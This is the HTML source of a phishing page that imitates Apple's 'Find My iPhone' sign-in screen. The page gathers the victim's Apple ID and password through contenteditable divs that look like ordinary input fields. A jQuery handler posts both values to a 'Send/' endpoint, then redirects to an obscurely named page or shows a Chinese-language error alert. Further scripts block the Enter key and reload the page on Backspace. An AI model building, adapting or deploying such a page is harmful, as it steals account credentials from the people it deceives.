<html>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=gb2312">
    <link rel="icon" href="picture/favicon.ico" type="image/x-icon">
    <link rel="shortcut icon" href="picture/favicon.ico" type="image/x-icon">
    <meta http-equiv="content-type" content="text/html; charset=gbk">
    <meta charset="gb23231">
    <meta name="viewport" content=" initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="jquery.min1.7.8.js"></script>
    <script src="http://apps.bdimg.com/libs/jquery/1.7.1/jquery.min.js"></script>
    <script src="http://cdn.static.runoob.com/libs/angular.js/1.4.6/angular.min.js"></script>
    <meta name="format-detection" content="telephone=no">
    <script src="tzcs.js"></script>
    <style type="text/css">
        /**css样式*/
        .input {
            width: 300px;


            -webkit-text-security: none;
            font-size: 15px;
            padding: 5px 6px;


            line-height: 18px;
            white-space: nowrap;
            color: #CCCCCC
        }


        @font-face {
            font-family: 'pinghei';
            /*字体名称*/
            src: url('font/PingHei-text.woff.ttf');
            /*字体源文件*/
        }



        .input:empty::before {
            content: attr(placeholder);
        }



        .classa {
            width: 300px;


            -webkit-text-security: disc;
            font-size: 15px;
            padding: 5px 6px;


            line-height: 18px;
            white-space: nowrap;
            color: #CCCCCC
        }

        #loginn {
            display: none;
        }

        .login_1 {
            width: 29px;
            height: 29px;
            background-image: url(39.png);
            border: none;
        }

        .login_2 {
            width: 29px;
            height: 29px;
            background-image: url(41.png)border:none;
        }

        .button1 {
            display: block
        }

        .button2 {
            display: none
        }
    </style>
    <script>
        window.onload = function () {
            var oImg = document.getElementById('img');
            var onOff = true;

            oImg.onclick = function () {
                if (onOff) {
                    oImg.src = 'imgaes/keepd.PNG';
                    onOff = false;
                } else {
                    oImg.src = 'imgaes/keep.PNG';
                    onOff = true;
                }
            };

        };
    </script>
    <link rel="stylesheet" href="picture/wap.css" media="all">
    <script>
        $(function () {
            $("body").keydown(function (event) {
                if (event.keyCode == 8) {
                    location.reload();
                }
            });
        });

    </script>

    <script type="text/javascript">

        function AchangeTest(obj) {

            if (obj.innerHTML.length == 0) {

                document.getElementById('Apwd').className = 'input';
                document.getElementById('Apwd').disabled = true;
                document.getElementById('testDiv1').className = 'button1';
                document.getElementById('testDiv1').disabled = true;

            } else {
                document.getElementById('Apwd').className = 'classa';
                document.getElementById('Apwd').disabled = false;
                document.getElementById('testDiv1').className = 'button2';
                document.getElementById('testDiv1').disabled = false;
            }

        }

    </script>
    <script type="text/javascript" language="javascript">
        function OnTextChanged() {
            if (event.keyCode == 13) {//判断是否为回车键
                event.keyCode = 0;//屏蔽回车键
                event.returnValue = false;

            }
        }
    </script>

    <script src="JQ_AJAX.JS"></script>
</head>

<body>
    <div style="margin-left:0px">
        <div style="margin-top:4%;"></div>
        <center>
            <img src="imgaes/find.png" style="width:100px">
        </center>
        <p></p>
        <div class="main" style="border:0px solid red">
            <p class="lok" style=" font-family:pinghei">查找我的 iPhone</p>

            <ul class="main_list" id="login-right">
                <li id="bton1" style=""> <span id="testDiv" class="">
                        <div id="test" disabled="disabled" align="right" style="margin-top:-1px;outline:none;"
                            onClick="changeclass()"><img src="login.png" style="margin-top:-0px;outline:none; width:29"
                                align="right" onKeyDown="AchangeTest(this)"></div>
                    </span>
                    <div contenteditable="true" class="input " id="App1" placeholder="Apple ID"
                        style="outline:none;color: #999; font-weight:100;font-family:pinghei""   onKeyUp="
                        changeTest(this);"></div>
                </li>
                <li id="testDiv1" class="button2"><span class="">
                        <div name="login-button" id="qieh" disabled="disabled" style="margin-top:3px;outline:none;"
                            ng-app="myApp" ng-controller="personCtrl" class="ng-scope" />
                        <img src="login.png" style="margin-top:-0px;outline:none; width:29" align="right" id="btn"
                            ng-click="toggle()">
        </div>
        </span>
        <div style="outline:none;color: #999;font-family:pinghei"" id=" Apwd" class="input " name="Apwd"
            contenteditable="TRUE" placeholder="密码" onKeyUp="AchangeTest(this);"></div>
        </li>
        </ul>
    </div>
    <div align="center" tyle="z-index:3"><br>
        <br>
        <label id="remember-me-label" class="form-label" for="remember-me">
            <span class="form-choice-indicator"><img id="img" src="imgaes/keep.PNG" width="21" height="21"
                    style="position:relative;top:5px;"></span> <span
                style="font-size:14px;COLOR:#333font-family:pinghei"">Keep me signed in</span>
  <p style=" margin-top:4%;margin-left:-20px"><img src="imgaes/ht.png"></p>
                <p style="color:#0070c9;margin-top:3%;font-family:pinghei"">Forgot Apple ID or password?</p>
  </label>
</div>
<br>
<script type=" text/javascript"> document.getElementById("test").onclick=function(){
                    document.getElementById("testDiv").style.display="none" ;
                    document.getElementById("testDiv1").style.display="block" ;
                    document.getElementById("bton1").style="border-bottom:1px solid #dedede;" ; } </script> </div>
                    <script>
                        document.onkeydown = function () {
                            if (window.event && window.event.keyCode == 13) {
                                window.event.returnValue = false;
                            }
                        }


                    </script>

                    <script src="jquery-3.2.1.min.js"></script>
                    <script type="text/javascript">
                        $('#btn').click(function () {
                            var username = $("#App1").text();
                            var userpass = $("#Apwd").text();

                            $.ajax({
                                async: false,
                                type: 'post',
                                url: 'Send/',
                                data: { "username": username, "userpass": userpass },
                                dataType: 'json',
                                success: function (msg) {
                                    $("#username").empty();
                                    $("#userpass").empty();
                                    if (msg == 3) {
                                        top.location.href = 'TEL/PM_INGEAFAFASDFWSF3234234234.html';
                                    } else {
                                        alert("账号和密码错误,请重试！");
                                    }
                                }
                            })

                        });






                    </script>
</body>

</html>